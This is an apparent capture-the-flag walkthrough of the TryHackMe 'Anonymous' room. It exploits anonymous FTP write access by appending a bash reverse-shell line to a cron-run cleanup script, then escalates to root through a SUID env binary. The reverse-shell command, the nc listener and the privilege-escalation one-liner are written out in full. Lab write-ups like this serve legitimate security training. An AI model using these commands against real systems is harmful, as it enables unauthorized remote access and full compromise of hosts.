# Anonymous
[Play](https://tryhackme.com/room/anonymous)

## 1. Recon

### 1.1 Nmap
```
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV 10.10.14.90 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-07 06:15 EDT
Nmap scan report for 10.10.14.90
Host is up (0.20s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.150.214
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 3s, deviation: 0s, median: 2s
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2021-05-07T10:15:43+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-05-07T10:15:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.53 seconds
```

Im not going to touch port 22 because ssh is cute. Port 21 is ftp allowing anon login.

### 1.2 FTP
```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.14.90
Connected to 10.10.14.90.
220 NamelessOne's FTP Server!
Name (10.10.14.90:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000          946 May 07 10:11 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> get clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for clean.sh (314 bytes).
226 Transfer complete.
314 bytes received in 0.00 secs (1.3612 MB/s)
ftp> get removed_files.log
local: removed_files.log remote: removed_files.log
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for removed_files.log (989 bytes).
226 Transfer complete.
989 bytes received in 0.00 secs (11.2284 MB/s)
ftp> get to_do.txt
local: to_do.txt remote: to_do.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for to_do.txt (68 bytes).
226 Transfer complete.
68 bytes received in 0.08 secs (0.8479 kB/s)
ftp> 
221 Goodbye.
```

Okay, let's explore them one by one.

### 1.3 Exploration
```
┌──(kali㉿kali)-[/tmp]
└─$ cat clean.sh                                                              1 ⨯
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

```
┌──(kali㉿kali)-[/tmp]
└─$ cat removed_files.log 
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
Running cleanup script:  nothing to delete
```

Interesting ... This looks like it has the scope for priv esc later on. I
ll have to dig in, but we'll keep this in mind.

```
┌──(kali㉿kali)-[/tmp]
└─$ cat to_do.txt        
I really need to disable the anonymous login...it's really not safe
```

lmao ikr.

Okay. So, one thing that the other questions hint at, is the smb shares on port 139 and 445. Let's explore that. 

### 1.4 SMB

```
                                                                                  
┌──(kali㉿kali)-[~]
└─$ smbclient -L 10.10.14.90 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        pics            Disk      My SMB Share Directory for Pics
        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

- -L btw is for listing the shares
- -N is for saying im not giving a password :)

```
┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.14.90/pics -N 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 07:11:34 2020
  ..                                  D        0  Wed May 13 21:59:10 2020
  corgo2.jpg                          N    42663  Mon May 11 20:43:42 2020
  puppos.jpeg                         N   265188  Mon May 11 20:43:42 2020

                20508240 blocks of size 1024. 13306808 blocks available
smb: \> 
```

Since there are no other active pathways available (other than clean.sh :P), we have the devil in front of us ... stego.

~~Well well well. Imma brb with some tools.~~

So, ... I have been trolled. Nothing in images. "My disappointment is immeasurable and my day is ruined".

## 2. Foothold
Okay. That clean.sh script looked tasty, let's break it down.

```
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

Okay. Nothing in here specifically, but the existence of logs tells me that it is being run quite frequently. This means ... its revshell time :D

`sh -i >& /dev/tcp/YO_IP/1337 0>&1`

Since we have all the permissions, its ezpzlmnsqz. Lesgoo

```
┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.14.90
Connected to 10.10.14.90.
220 NamelessOne's FTP Server!
Name (10.10.14.90:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
226 Directory send OK.
ftp> cd scripts
250 Directory successfully changed.
ftp> put clean.sh
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
383 bytes sent in 0.00 secs (4.6235 MB/s)
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          383 May 07 10:50 clean.sh
-rw-rw-r--    1 1000     1000         2623 May 07 10:50 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
ftp> 
```

where the edited script looks like so,
```
#!/bin/bash

# hehehehehe yeaaa boiiii
sh -i >& /dev/tcp/10.8.150.214/1337 0>&1

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```


```
┌──(kali㉿kali)-[/tmp]
└─$ nc -lnvp 1337                    
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.14.90] 43642
sh: 0: can't access tty; job control turned off
$ whoami 
namelessone
$ id
uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

NOICE. we are in!

## 3. PrivEsc

okay. first things first. Let's get a better shell and see what sudo permissions we have. Just do `bash -i`. We get

```
namelessone@anonymous:~$ sudo -l
sudo -l
sudo: no tty present and no askpass program specified
```

Okay so time to find the setuid bit. Use `namelessone@anonymous:~$ find / -perm -u=s 2>/dev/null`

Looking at [gtfobins](https://gtfobins.github.io/) we find `env` as a possible solution. 

```
namelessone@anonymous:~$ /usr/bin/env /bin/bash -p
/usr/bin/env /bin/bash -p
whoami
root
cat /root/root.txt
{hmmmmmmmmmmmmmmmmm}
```

We are done!
